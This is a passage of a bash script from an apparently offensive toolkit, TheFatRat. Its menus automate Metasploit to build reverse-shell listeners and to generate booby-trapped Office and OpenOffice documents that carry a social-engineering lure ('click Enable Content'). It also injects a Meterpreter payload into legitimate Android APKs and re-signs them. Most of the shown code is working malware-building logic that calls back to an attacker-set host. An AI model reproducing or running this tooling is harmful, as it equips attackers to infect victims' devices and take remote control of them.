                                echo "  to: $list/$fln.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select $fln.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                n|no|No|NO)
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                *)
                                echo ""
                                echo -e $red "  Invalid Input"
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;
esac

			elif test $fatrat1 == '4' #Android
				then
        spinlong
				rm temp/*.rc > /dev/null 2>&1
				touch "temp/meterpreter_android.rc"
        echo use exploit/multi/handler > "temp/meterpreter_android.rc"
				pldand
        echo set PAYLOAD $payload >> "temp/meterpreter_android.rc"
				echo -e $okegreen""
				echo -e $yellow "  Your local IP address is : $lanip"
				echo -e $yellow "  Your public IP address is : $publicip"
				echo -e $yellow "  Your Hostname is : $hostn"
        if [ ! -f "$defcon" ]
        then
        yourip=""
        yourport=""
        fi
        spinlong
        echo
				echo -e $okegreen""
           	 		read -p '  Set LHOST IP: ' yourip
                echo ""
           	 		read -p '  Set LPORT: ' yourport
        invalid1
        if [ $err == "1" ]
        then
        echo -e $okegreen ""
        echo -n "  Press [ENTER] key to return to menu ."
        read inp
        clisteners
        fi
                echo set LHOST $yourip >> "temp/meterpreter_android.rc"
           	 		echo set LPORT $yourport >> "temp/meterpreter_android.rc"
           	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
           	 		echo exploit -j  >> "temp/meterpreter_android.rc"
                echo ""
                echo -e $okegreen "  Do you want to save this configuration to use in future ?"
                                echo ""
                                echo -ne "   Choose y/n :" ;tput sgr0
                                read svl
                                case $svl in
                                y|Y|Yes|YES|yes)
                                echo ""
                                echo -e $okegreen "  Write the name for this config. (ex: android-config)"
                                echo ""
                                echo -ne $cyan "  Filename : " ;tput sgr0
                                read fln

#empty input then save as default name
                                if [ -z $fln ]
                                then
                                cp $path/temp/meterpreter_android.rc $list/android-config.rc >/dev/null 2>&1
                                echo "  Empty input detected , configuration file as android-config.rc "
                                echo "  to: $list/android-config.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select android.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu ."
                                read continue
                                clisteners
                                fi

#input detected
                                cp $path/temp/meterpreter_android.rc $list/$fln.rc >/dev/null 2>&1
                                echo "  Configuration file saved as $fln.rc "
                                echo "  to: $list/$fln.rc"
                                echo ""
                                echo -e $yellow ""
                                echo "  To load this configuration press on this menu 5 and select $fln.rc"
                                echo ""
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                n|no|No|NO)
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
                                ;;
                                *)
                                echo ""
                                echo -e $red "  Invalid Input"
                                echo -e $okegreen ""
                                echo -ne $okegreen"  Press [ENTER] key to return to menu . "
                                read continue
                                clisteners
;;
esac


                  elif test $fatrat1 == '5'
                  then
                  echo ""
# do an ls command on listeners folder to search .rc files , and count them
                  lit=`ls -1 $list/*.rc 2>/dev/null | wc -l`
#If on last count there is more that 0 files then proceed
                  if [ $lit != 0 ]
                  then
                  echo -e $orange "  +-------------------------+"
                  echo -e $orange "  |$okegreen Current saved listeners$orange |"
                  echo -e $orange "  +-------------------------+"
                 # Rc files detected in listeners folder , print their names
		 for liste in config/listeners/*.rc; do
                  echo ${liste##*/}
                  done
                  echo ""
                  echo -e $orange "  +-------------------------+"
                  echo ""
                  echo -e $okegreen "  Write the listener config file you want to load in msfconsole"
                  echo ""
                  echo -ne "   Filename : ";tput sgr0
                  read fname
		  #case user do not input any value then return to menu listeners
                  if [ -z $fname ]
                  then
                  clear
                  clisteners
                  fi
		  #Check if the input rc from user in list really exists
                  if [ ! -f $list/$fname ]
                  then
                  echo ""
                  echo -e $red "  The filename you wrote ($fname) do not exist in this list :"
                  echo ""
                  echo -e $orange "  +-------------------------+"
                  echo -e $orange "  |$okegreen Current saved listeners$orange |"
                  echo -e $orange "  +-------------------------+"
                  echo -e $okegreen ""
                  # rc file did not exists , print again the current list and return to listeners menu
		  for liste in config/listeners/*.rc; do
                  echo ${liste##*/}
                  done
                  echo ""
                  echo -e $yellow "  Make sure you write the correct filename to load"
                  echo ""
                  echo -e $okegreen "  Press [ENTER] key to return to menu"
                  read nfln
                  clear
                  clisteners
                  fi
		  #rc filename input exists , load msfconsole with that config
                  xterm -fa monaco -fs 13 -bg black -e $msfconsole -r $list/$fname
                  clear
                  menu
                  else
		  #no rc files were detected in listeners folder
                  echo -e $yellow "  No listeners configuration files were found."
                  echo ""
                  echo -e $okegreen "  Press [ENTER] key to return to menu"
                  read nfln
                  clear
                  clisteners
                  fi

                  elif test $fatrat1 == '6'
          				then
           				clear
          				menu
          	 	    else
          			  echo -e "  Incorrect Number"
          			  fi
          			echo -n -e "  Do you want exit Fatrat ? ( y/n ) : "
          		  read back
          		  case $back in
y|Y|Yes|YES|yes)
clear
exit
;;
n|N|No|NO|no)
clisteners
;;
*)
clisteners
;;
esac

}

function microsploit() {
#metasploit modules
#microsoft metasploit packet auto create backdoor macro attack
#code by edo maland > screetsec
#part of fatrat feature
#compatible with metasploit metasploit v4.14.0-dev { new payload in metasp 2017 like macro}
rm -rf $msploit >/dev/null 2>&1

APPNAME='Microsfot Metasploit Packet [ Easy ]'
VERSION='1.0.0'
NAME='Screetsec - Edo Malad '
CODENAME='Mario Bros'

  clear
  echo -e $red"  <==============================================>"
  echo -e $white"  ||$okegreen  _____ _             _____     _     _ _    $white||"
  echo -e $white"  ||$okegreen |     |_|___ ___ ___|   __|___| |___|_| |_  $white||"
  echo -e $white"  ||$okegreen | | | | |  _|  _| . |__   | . | | . | |  _| $white||"
  echo -e $white"  ||$okegreen |_|_|_|_|___|_| |___|_____|  _|_|___|_|_|   $white||"
  echo -e $white"  ||$okegreen                           | |               $white||"
  echo -e $red"  <===================================================>"
  echo -e "\t$white||  "$white" |=| "$okegreen"$APPNAME $white||"
  echo -e "\t||  $white |=| "$okegreen"Version : $VERSION \t\t   $white   ||"
  echo -e "\t||  $white |=| "$okegreen"Code by : $NAME $white    || "
  echo -e "\t||  $white |=| "$okegreen"Codename: $CODENAME $white \t\t      || "
  echo -e $white"\t||"$red"============================================$white||\n"
  echo -e $white"  |"$okegreen"1$white| "$cyan"Microsoft Stack overflow in MSCOMCTL.OCX"
	echo -e $white"  |"$okegreen"2$white| "$cyan"The Microsoft Office Macro on Windows "
	echo -e $white"  |"$okegreen"3$white| "$cyan"The Microsoft Office Macro on Mac OS X "
	echo -e $white"  |"$okegreen"4$white| "$cyan"Apache OpenOffice on Windows (PSH)"
	echo -e $white"  |"$okegreen"5$white| "$cyan"Apache OpenOffice on Linux/OSX (Python)"
	echo -e $white"  |"$okegreen"6$white| "$cyan"Exit\n"

# Seems to fix some metasploit bugs
rm -rf ~/.msf4/local/* >/dev/null 2>&1
echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"microsploit$okegreen]:"
echo -ne $okegreen" └─────► " ;tput sgr0
read choice
case $choice in
   1)
          echo -e $red"   Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
          echo -e $okegreen""
          echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
          echo -e $yellow "  Your public IP address is : $publicip"
          echo -e $yellow "  Your Hostname is : $hostn"
          if [ ! -f "$defcon" ]
          then
          yourip=""
          yourport=""
          fi
          echo -e $okegreen""
          if [ -z "$yourip" ]; then
	        read -p '   Set LHOST IP: ' yourip
          fi
          echo -e $okegreen ""
          if [ -z "$yourport" ]; then
          read -p '   Set LPORT: ' yourport
          fi
          echo ""
					echo -ne $okegreen "  Please enter the base name for output files :" ;tput sgr0
					read fira
          invalid
          if [ $err == "1" ]
          then
          echo -e $okegreen ""
          echo -n "Press [ENTER] key to return to menu ."
          read inp
          microsploit
          fi
          spinlong
					echo ""
					pldwin
					spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/windows/fileformat/ms12_027_mscomctl_bof" >$meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.doc" >> $meterp
          echo "exploit" >> $meterp
          msploitr
          msft="$path/temp/msff"
          echo "$fira.doc" > "$msft"
          chmod +x "$path/grab" > /dev/null 2>&1

#On this option grab script must be used to get the generated exploit by msfconsole
#With option on msfconsole exit -y , msfconsole is not able to generate the doc file properly

          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
         	xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
          rm -rf $path/temp/msff >/dev/null 2>&1
          cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
      	    	echo -e $okegreen""
                fidoc=$path/output/$fira.doc
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
 ;;

2)
          echo -e $red"\n   Worked on Microsoft Office on Windows  "
					echo -e $okegreen""
          echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
          echo -e $yellow "  Your public IP address is : $publicip"
          echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
          echo -e $okegreen""
					if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '   Set LPORT: ' yourport
                                fi
echo ""
					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
microsploit
fi
					echo ""
					#setup body
					echo -ne $okegreen "  Enter the message for the document body (ENTER = default) : " ;tput sgr0
					read bodys
					#echo $bodys
						if [[ "$bodys" == "" ]]; then
							bodys="Contents of this document are protected. Please click Enable Content to continue."
						fi
					#setupexe
					echo""
					echo -ne $okegreen "  Are u want Use custom exe file backdoor ( y/n ): " ;tput sgr0
					read exe
						if [ $exe != 'y' ] && [ $exe != 'Y' ]
							then
					#payload n
          spinlong
					echo ""
					pldwin
                                        spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/fileformat/office_word_macro" >$meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.docm" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "exploit" >> $meterp
          echo "exit -y" >> $meterp
          msploitr
          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo ""
         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""

         	fidoc=$path/output/$fira.docm
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi

						elif [ $exe != 'n' ] && [ $exe != 'N' ]
							then
					#payload y
					selexe
					echo ""
					pldwin
					spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/fileformat/office_word_macro" >$meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.docm" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "set EXE::Custom $exef" >> $meterp
          echo "exploit" >> $meterp
          echo "exit -y" >> $meterp
          msploitr
         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo ""
         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
					echo ""

                fidoc=$path/output/$fira.docm
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
fi
;;

3)
          echo -e $red"   Worked on Libre Office on Mac ( Python )  "
          echo -e $okegreen""
          echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
          echo -e $yellow "  Your public IP address is : $publicip"
          echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
          echo -e $okegreen""
          if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '   Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
microsploit
fi
					echo ""
					#setup body
					echo -ne $okegreen "  Enter the message for the document body (ENTER = default) : " ;tput sgr0
					read bodys
					#echo $bodys
						if [[ "$bodys" == "" ]]; then
							bodys="Contents of this document are protected. Please click Enable Content to continue."
							#echo $bodys
						fi
					#setupexe

					echo""
					echo -ne $okegreen "  Are u want Use custom exe file backdoor ( y/n ): " ;tput sgr0
					read exe
						if [ $exe != 'y' ] && [ $exe != 'Y' ]
							then
					#payload n
          echo ""
          spinlong
					pldmac
					spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/fileformat/office_word_macro" >$meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.docm" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "set target 1" >> $meterp
          echo "exploit" >> $meterp
          echo "exit -y" >> $meterp
          msploitr
         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo ""
    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
        	echo -e $okegreen""

                fidoc=$path/output/$fira.docm
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
						elif [ $exe != 'n' ] && [ $exe != 'N' ]
							then
					#payload y
					selexe
					fi
					pldmac
					spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/fileformat/office_word_macro" >$meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.docm" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "set set EXE::Custom $exef" >> $meterp
          echo "set target 1" >> $meterp
          echo "exploit" >> $meterp
          echo "exit -y" >> $meterp
          msploitr
         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo ""
         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
         	fidoc=$path/output/$fira.docm
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
;;

4)
          echo -e $red"   Apache OpenOffice on Windows (PSH) "
					echo -e $okegreen""
          echo -e $okegreen""
          echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
          echo -e $yellow "  Your public IP address is : $publicip"
          echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
          echo -e $okegreen""
	        if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '   Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
microsploit
fi
					echo ""
					#setup body
					echo -ne $okegreen "  Enter the message for the document body (ENTER = default) : " ;tput sgr0
					read bodys
					#echo $bodys
						if [[ "$bodys" == "" ]]; then
							bodys="Contents of this document are protected. Please click Enable Content to continue."
							#echo $bodys
						fi

					echo ""
          spinlong
					pldwin
                                        spinlong
					echo ""
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
          echo "set target 0" >> $meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.odt" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "exploit" >> $meterp
          msploitr
          msft="$path/temp/msff"
          echo "$fira.odt" > "$msft"
          chmod +x "$path/grab" > /dev/null 2>&1

#On this option grab script must be used to get the generated exploit by msfconsole
#With option on msfconsole exit -y , msfconsole is not able to generate the odt file properly
          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
          xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
          rm -rf $msff >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo -e $okegreen""
         	fidoc=$path/output/$fira.odt
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
;;

      5)
                   echo -e $red"   Apache OpenOffice on Linux (PSH) "
                   echo -e $okegreen""
                   echo -e $yellow "  Your local IPV4 address is : $lanip"
                   echo -e $yellow "  Your local IPV6 address is : $lanip6"
                   echo -e $yellow "  Your public IP address is : $publicip"
                   echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
                   echo -e $okegreen""
				if [ -z "$yourip" ]; then
				read -p '   Set LHOST IP: ' yourip
                                fi
                                echo -e $okegreen ""
                                if [ -z "$yourport" ]; then
                                read -p '   Set LPORT: ' yourport
                                fi
					echo ""
					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
					read fira
invalid
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
microsploit
fi
					echo ""
					#setup body
					echo -ne $okegreen "  Enter the message for the document body (ENTER = default) : " ;tput sgr0
					read bodys
					#echo $bodys
						if [[ "$bodys" == "" ]]; then
							bodys="Contents of this document are protected. Please click Enable Content to continue."
							#echo $bodys
						fi

					echo ""
          spinlong
					pldmul
                                        spinlong
					echo ""
					gboor
					spinlong
					echo ""
          rm -rf $path/temp/* >/dev/null 2>&1
          touch $meterp
          echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
          echo "set target 1" >> $meterp
          echo "set PAYLOAD $payload" >> $meterp
          echo "set LHOST $yourip" >> $meterp
          echo "set LPORT $yourport" >> $meterp
          echo "set FILENAME $fira.odt" >> $meterp
          echo "set BODY $bodys" >> $meterp
          echo "exploit" >> $meterp
          msploitr
          msft="$path/temp/msff"
          echo "$fira.odt" > "$msft"
          chmod +x "$path/grab" > /dev/null 2>&1

#On this option grab script must be used to get the generated exploit by msfconsole
#With option on msfconsole exit -y , msfconsole is not able to generate the odt file properly
          gnome-terminal -t "grab" --geometry=600x400 --working-directory="$path" -e "bash -c '$path/grab.sh'; bash"
         	xterm -T "Microsploit" -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
          rm -rf $meterp >/dev/null 2>&1
          rm -rf $path/temp/msff >/dev/null 2>&1
                cat $path/temp/xterm.tmp | while read LINE
                do
                echo $LINE >> $msploit
                done
                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
         	echo ""
         	echo -e $okegreen""
         	fidoc=$path/output/$fira.odt
                if [ -f "$fidoc" ]
                then
                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
                echo -e
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
         	else
                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
check $path/logs/msploit.log for more information about the error ."
                echo -e $green ""
                read -rsp $'Press [ENTER] key to return to menu\n' -n 1 key
          microsploit
fi
;;
        6)
        clear
        menu
;;
*)
microsploit
;;
esac
}

#EMBEDBACKDOORAPK
function embedapk() {
resize -s 45 86 > /dev/null
clear
echo -e $okegreen"[ ]===========================================================================$okegreen[ ]"
echo -e $okegreen"[ ]$cyan                                                                      $okegreen     [ ]"
echo -e $okegreen"[ ]$cyan                          )  (         )      )   (    (        )     $okegreen     [ ]   ";
echo -e $okegreen"[ ]$cyan   (     (        (     ( /(  )\ )    ( /(   ( /(   )\ ) )\ )  ( /(  (    $okegreen [ ]   ";
echo -e $okegreen"[ ]$cyan   )\    )\       )\    )\())(()/(    )\())  )\()) (()/((()/(  )\()) )\ )  $okegreen[ ]   ";
echo -e $okegreen"[ ]$cyan  ((_)((((_)(   (((_) |((_)\  /(_))  ((_)\  ((_)\   /(_))/(_))((_)\ (()/(  $okegreen[ ]   ";
echo -e $okegreen"[ ]$cyan  (_)   )\_ )\  )\___ |_ ((_)(_))_   ((_)   ((_)   (_)) (_))  _((_) /(_))_ $okegreen[ ]  ";
echo -e $okegreen"[ ]$cyan | _ ) (_)_\(_)((/ __|| |/ /  |   \  / _ \  / _ \ | _ \|_ _| | \| |(_)) __|$okegreen[ ] ";
echo -e $okegreen"[ ]$cyan | _ \  / _ \   | (__   ' <   | |) || (_) || (_) ||   / | |  | .\` |  | (_ |$okegreen[ ] ";
echo -e $okegreen"[ ]$cyan |___/ /_/ \_\   \___| _|\_\  |___/  \___/  \___/ |_|_\|___| |_|\_|   \___|$okegreen[ ]";
echo -e $okegreen"[ ]$okegreen===========================================================================$okegreen[ ]"
echo -e $okegreen"[ ]$red            Embed a Metasploit Payload in an original .apk files           $okegreen[ ]"
echo -e $okegreen"[ ]$red This script is POC for injecting metasploit payload arbitary apk backdoor $okegreen[ ]"
echo -e $okegreen"[ ]$okegreen===========================================================================$okegreen[ ]"
echo ""
echo "Cleaning Temp files"
rm -rf temp/*
sleep 2
echo "Done!"
echo -e $okegreen""
echo -e $yellow "  Your local IPV4 address is : $lanip"
                                echo -e $yellow "  Your local IPV6 address is : $lanip6"
echo -e $yellow "  Your public IP address is : $publicip"
echo -e $yellow "  Your Hostname is : $hostn"
if [ ! -f "$defcon" ]
then
yourip=""
yourport=""
fi
echo -e $okegreen""
if [ -z "$yourip" ]; then
read -p '  Set LHOST IP: ' yourip
fi
echo -e $okegreen ""
if [ -z "$yourport" ]; then
read -p '  Set LPORT: ' yourport
fi
invalid1
if [ $err == "1" ]
then
echo -e $okegreen ""
echo -n "Press [ENTER] key to return to menu ."
read inp
embedapk
fi
echo ""
selapk
#cp user selected apk to temp folder
cp $exef $path/temp/app.apk >/dev/null 2>&1
apkt="$path/temp/app.apk"
# check if apk was copyed succefully
if [ ! -f $apkt ]; then
    echo ""
echo -e $red "There was a problem copying your apk file to final destination ."
    read -rsp $'Press [ENTER] key to continue to return to fatrat menu\n' -n 1 key
menu
  fi

echo ""
#go to payload android menu
pldand
echo ""
echo ""
spinlong
echo ""
sleep 1
#select tool to build apk rat
echo -e $orange "+------------------------------+"
echo -e $orange "|$white [$okegreen 1$white ]$yellow Use Backdoor-apk 0.2.2$orange |"
echo -e $orange "|$white [$okegreen 2$white ]$yellow Use old Fatrat method$orange  |"
echo -e $orange "+------------------------------+"
echo ""
echo -ne $cyan "Select Tool to create apk : ";tput sgr0
read apkto
case $apkto in
1)
echo ""
spinlong
outf="app_backdoor.apk"
gboor2
# remove any existent apkconfig file and create a new one with the data for backdoor_apk to read
rm -f $apkconfig >/dev/null 2>&1
touch $apkconfig
echo "app.apk" > $apkconfig
echo "Rat.apk" >> $apkconfig
echo $payload >> $apkconfig
echo $yourip >> $apkconfig
echo $yourport >> $apkconfig
./backdoor_apk
echo ""
sleep 2
   read -rsp $'Press [ENTER] key to continue to return to fatrat menu\n' -n 1 key
clear
menu
;;

2)
echo -e $okegreen ""
spinlong

#removing previous logs
rm -rf $log >/dev/null 2>&1
touch $log >/dev/null 2>&1

outf="app_backdoored.apk"
gboor2
echo -e $okegreen ""
echo "[*] Creating RAT payload with msfvenom"

#Creating payload and storing info in logfile
$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/temp/payload.apk >>$log /dev/null 2>&1

#Checking if payload exists
pld=$path/temp/payload.apk
if [ -f "$pld" ]
then
echo "[✔] Done!"
else
echo -e $red ""
echo "[x] There was an error in the creation of the payload .
Check log file at : $log"
rm -rf temp/* > /dev/null 2>&1
read -rsp $'Press [ENTER] key to continue to return to fatrat menu\n' -n 1 key
clear
menu
fi
sleep 2
echo "[*] Creating a Valid Certificate"

#Creating certificate and storing info in logfile
$keytool -genkey -v -keystore $path/temp/debug.keystore -storepass android -alias androiddebugkey -keypass android -dname "CN=Android Debug,O=Android,C=US" -keyalg RSA -keysize 2048 -validity 10000 >>$log 2>&1

#Checking if certificate was created
cert=$path/temp/debug.keystore
if [ -f "$cert" ]
then
echo "[✔] Done!"
else
echo -e $red ""
echo "[x] There was an error creating a valid certificate .
Check log file at : $log"
rm -rf temp/* > /dev/null 2>&1
menu
fi
sleep 2

echo "[*] Starting the merging process of RAT with the APK you selected"
echo -e $okegreen ""

#Starting the process of inserting the payload into original apk file
ruby $apkembed $path/temp/app.apk
sleep 2

echo -e $okegreen ""
#Checking if backdoor apk was created succefully
fiapk=$path/temp/app_backdoored.apk
if [ -f "$fiapk" ]
then
echo "[✔] Done!"
sleep 1
echo "[*] Signing your Rat APK"
$sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/temp/app_backdoored.apk androiddebugkey >>$log 2>&1
echo "[✔] Done!"
else
echo $red ""
echo "[x] There was an error in the creation of your RAT APK file , the possible reasons are :
- The architecture of the file is not for android
- The original APK is protected
- It was not possible to inject the payload in the hook you selected (in this case select a different hook point)
Check log file at : $log"
echo -e $okegreen ""
